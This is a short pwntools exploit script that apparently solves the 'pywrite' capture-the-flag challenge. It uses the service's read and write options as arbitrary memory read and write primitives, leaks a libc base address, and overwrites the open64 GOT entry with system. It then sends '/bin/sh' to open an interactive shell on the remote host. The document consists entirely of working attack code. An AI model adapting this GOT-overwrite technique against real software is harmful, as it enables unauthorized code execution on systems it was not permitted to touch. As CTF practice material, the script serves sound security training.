from pwn import *

chall = ELF("python3")
context.binary = chall

# stream = process('./run.sh')
stream = remote('pywrite.chal.imaginaryctf.org', 1337)

def aar(addr):
  stream.sendlineafter(b'> ', b'1')
  stream.sendlineafter(b'? ', str(addr).encode())
  return int(stream.recvline(keepends=True).decode())

def aaw(addr, val):
  stream.sendlineafter(b'> ', b'2')
  stream.sendlineafter(b'? ', str(val).encode())
  stream.sendlineafter(b'? ', str(addr).encode())

libc_addr = aar(0x8f6060) - 0x8e020
print(f'[+] {hex(libc_addr)=}')

libc = ELF('libc.so.6')
libc.address = libc_addr

aaw(chall.got['open64'], libc.symbols['system'])

stream.sendline(b'3')
stream.sendline(b'/bin/sh')

stream.interactive()
